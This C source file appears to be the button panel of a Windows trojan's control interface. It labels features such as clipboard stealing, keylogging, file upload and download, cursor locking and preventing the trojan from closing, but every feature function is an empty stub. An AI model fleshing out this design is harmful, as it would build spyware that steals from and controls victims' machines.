#include "buttons.h"



typedef enum {
    CLIPBOARD_STEAL,
    SCREENSHOT,
    KEYLOGGER,
    UPLOAD_DOWNLOAD_WIN,
    FILE_EXPLORER,
    LOCK_CURSOR,
    PREVENT_CLOSE
}ButtonId;

const unsigned short* ButtonText[BUTTONS_AMOUNT] = {
       L"Steal clipboard",
       L"Screenshot",
       L"Start keylogger",
       L"Upload or download files",
       L"Open file explorer",
       L"Lock cursor",
       L"Prevent closing trojan"
};


typedef void (*FuncPtr)(void);

static void StealClipboard() {

}

static void Screenshot() {
    
}

static void Keylogger() {

}

static void UploadDownloadFiles() {

}

static void OpenFileExplorer() {

}

static void LockCursor() {

}

static void PreventClosing() {

}


// kupa

void handleButtons(ButtonId id) {

}

void createButtons(HWND hwnd, HWND* buttons, UINT size) {
    int x = 20, y = 20;
    const int width = 180, height = 30;



    for (ButtonId id = CLIPBOARD_STEAL; id < size; id++) {
        buttons[id] = CreateWindow(L"Button", ButtonText[id], WS_VISIBLE | WS_CHILD | WS_BORDER, x, y, width, height, hwnd, NULL, NULL, NULL);
        y += 40;
    }
}
